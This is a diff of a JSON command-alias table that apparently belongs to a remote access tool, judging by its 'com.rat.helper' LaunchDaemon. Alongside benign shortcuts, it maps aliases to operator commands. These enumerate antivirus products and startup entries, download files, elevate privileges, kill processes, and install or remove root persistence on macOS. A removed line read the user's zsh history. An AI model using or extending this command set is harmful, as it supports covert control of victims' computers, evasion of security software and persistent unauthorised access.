@@ -4,26 +4,25 @@
     "openurl": "pyexec import webbrowser;webbrowser.open('<url>')"
   },
   "win": {
-    "enum_av": "powershell.exe Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct ^| Select-Object displayName",
-    "startup": "powershell.exe Get-CimInstance Win32_StartupCommand ^| Select-Object Name, Command, Location",
-    "pkill": "wmic process where name='<process_name>' call terminate",
-    "port": "powershell.exe Get-NetTCPConnection -State Listen ^| Sort-Object LocalPort ^| Select-Object LocalAddress, LocalPort, OwningProcess",
-    "wget": "powershell.exe Invoke-WebRequest -Uri <url> -OutFile <file>",
-    "sudo": "powershell.exe Start-Process -Verb runas <command>",
+    "enum_av": "powershell Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct ^| Select-Object displayName",
+    "startup": "powershell Get-CimInstance Win32_StartupCommand ^| Select-Object Name, Command, Location",
+    "port": "powershell Get-NetTCPConnection -State Listen ^| Sort-Object LocalPort ^| Select-Object LocalAddress, LocalPort, OwningProcess",
+    "wget": "powershell Invoke-WebRequest -Uri <url> -OutFile <file>",
+    "sudo": "powershell Start-Process -Verb runas <command>",
     "ip": "powershell Get-NetIPAddress -AddressFamily IPv4 ^| Select-Object InterfaceAlias, IPAddress",
-    "show_desktop": "powershell.exe (New-Object -ComObject shell.application).toggleDesktop()",
+    "show_desktop": "powershell (New-Object -ComObject shell.application).toggleDesktop()",
     "touch": "type nul > <filename>",
-    "lockscreen": "rundll32.exe user32.dll,LockWorkStation",
-    "md5": "certUtil -hashfile <file> MD5"
+    "lock_screen": "rundll32 user32.dll,LockWorkStation",
+    "md5": "certUtil -hashfile <file> MD5",
+    "pkill": "wmic process where name='<process_name>' call terminate"
   },
   "mac": {
     "sleep": "read ping -c <sec> 127.0.0.1",
-    "killport": "kill -9 $(lsof -t -i:<port>)",
-    "ipmac": "ipconfig getifaddr en0",
-    "zsh_history": "cat ~/.zsh_history",
-    "displayoff": "pmset displaysleepnow",
+    "kill_port": "kill -9 $(lsof -t -i:<port>)",
+    "ip": "ipconfig getifaddr en0",
+    "display_off": "pmset displaysleepnow",
     "clean_ds": "find . -name \"._*\" -type f -delete && find . -name \".DS_Store\" -type f -delete",
-    "persiston": "sudo launchctl bootstrap system /Library/LaunchDaemons/com.rat.helper.plist",
-    "persistoff": "sudo launchctl bootout system /Library/LaunchDaemons/com.rat.helper.plist",
+    "persist_on": "sudo launchctl bootstrap system /Library/LaunchDaemons/com.rat.helper.plist",
+    "persist_off": "sudo launchctl bootout system /Library/LaunchDaemons/com.rat.helper.plist"
   }
 }
